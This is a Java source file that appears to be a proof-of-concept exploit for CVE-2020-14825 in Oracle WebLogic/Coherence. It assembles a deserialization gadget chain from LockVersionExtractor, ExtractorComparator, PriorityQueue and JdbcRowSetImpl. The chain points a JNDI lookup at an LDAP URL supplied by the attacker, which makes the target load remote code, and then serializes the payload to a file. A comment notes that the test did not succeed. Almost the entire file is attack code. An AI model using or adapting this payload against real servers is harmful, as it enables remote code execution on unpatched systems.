package com._51pwn.CVE_2020_14825;

import com._51pwn.Tools;
import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.comparator.ExtractorComparator;
import oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor;
import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;
import ysoserial.payloads.util.Reflections;

import java.util.PriorityQueue;

// CVE-2020-14825 测试未成功
// 而 CVE-2020-14825 用的类是oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor
public class Main {
    public static void main(String[] args) throws Exception {
        String ldap = args[1];//"ldap://docker.for.mac.localhost:1389/UpX34defineClass";
        // 未后续 操作 方法 getDatabaseMetaData 进行定义
        MethodAttributeAccessor accessor = Tools.GetMethodAttributeAccessor("getDatabaseMetaData");

        LockVersionExtractor extractor = new LockVersionExtractor(accessor,"");

        // 两个，用来做比较触发链条
        PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(extractor));
        Reflections.setFieldValue(queue,"size",2);

        // 获取成员变量的引用关系， 该属性是 protected transient
        // 该例子告诉我们 writeObject 中用了 transient对象了
        Object[] queueArray = (Object[])(Reflections.getFieldValue(queue, "queue"));

//         getDatabaseMetaData -> connect -> getDataSourceName -> InitialContext.lookup -> getConnection(user,pswd)
        JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(JdbcRowSetImpl.class);
//        oracle.jdbc.pool.OraclePooledConnection jdbcRowSet = Reflections.createWithoutConstructor(oracle.jdbc.pool.OraclePooledConnection.class);
//        Hashtable map = new Hashtable<>();
//        Map map1 = new HashMap<>();
//        map.put("connection_properties",map1);
//        map1.put("connection_url","ldap");
//        jdbcRowSet.setProperties(map);
        jdbcRowSet.setDataSourceName(ldap);

        queueArray[0] = jdbcRowSet;

        Tools.WtOo1(queue);
        System.out.println("write ok");
    }
}
